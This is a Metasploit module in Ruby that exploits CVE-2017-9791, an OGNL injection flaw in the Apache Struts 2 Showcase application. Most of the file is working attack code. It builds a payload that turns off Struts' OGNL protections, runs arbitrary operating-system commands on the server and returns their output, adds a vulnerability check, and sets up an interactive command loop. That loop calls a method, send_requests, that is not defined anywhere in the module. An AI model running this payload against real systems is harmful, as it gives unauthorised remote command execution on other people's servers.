##CVE-2017-9791.rb module for Metasploit FrameWork
require 'msf/core' ###required lib

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient ### module for sending requests

  def initialize(info = {}) ## provide informations for this exploit
    super(update_info(info,
      'Name'           => 'Apache-Struts2-Showcase',
      'Description'    => %q{
        CVE-2017-9791 : Apache Struts-2 Showcase application exploit !
      },
      'Author'         => '@dienpv-K58N',
      'References'     => [
        [ 'CVE', '2017-9791' ],
        [ 'EDB', '42324' ],
        [ 'URL', 'https://cwiki.apache.org/confluence/display/WW/S2-048' ]
       ],
      'License'        => MSF_LICENSE
    ))
	register_options(
      [
        Opt::RPORT(8080),
        OptString.new('PATH', [ true, 'The path to a struts application action', '/struts2-showcase/integration/saveGangster.action' ]),
        OptString.new('PARAMETER', [ true, 'The HTTP POST parameter', 'name' ]),
	#OptString.new('URL', [ true, 'Url of the target - ex: http:target.com.vn/', '/' ])
      ]
    )
  end
  ##
  def payload(cmd) ##main payload
    pl = "${"
    pl << "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    pl << "(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    pl << "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    pl << "(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())."
    pl << "(#context.setMemberAccess(#dm))))."
    pl << "(#cmd='#{cmd}')."
    pl << "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    pl << "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    pl << "(#p=new java.lang.ProcessBuilder(#cmds))."
    pl << "(#p.redirectErrorStream(true)).(#process=#p.start())."
    pl << "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    pl << "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())"
    pl << "}"
    return pl
  end
  ##
  def check ###Check if the target is vulerable or not
  
    print_status "Checking for CVE-2017-9791"
    pre_check = send_request_cgi({
      'method'        => 'POST',
      'uri'           => datastore['PATH'],
      'encode_params' => true,
      'vars_post'      => {
        datastore['PARAMETER'] => payload("echo x!@&^banNMFk1343849XCVMjdjfkdfjk))////^^2"),
        'age'                     => 12,
        '__checkbox_bustedBefore' => 'true',
        'description'             => 'something_is_here'
      }
    })

    html = pre_check.body
    if pre_check.code == 200 && html.include?("x!@&^banNMFk1343849XCVMjdjfkdfjk))////^^2")
      print_status("It seems good !!!")
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end

  end
  ##
  def run ##exploit method
    print_status "Exploiting..."
    while(true)
      puts("------------------------------------------------------------")
      print("[*]Enter the command > ")
      cmd = gets.chomp #remove newline character
      result = send_requests(cmd)
      puts result
    end
  end

end

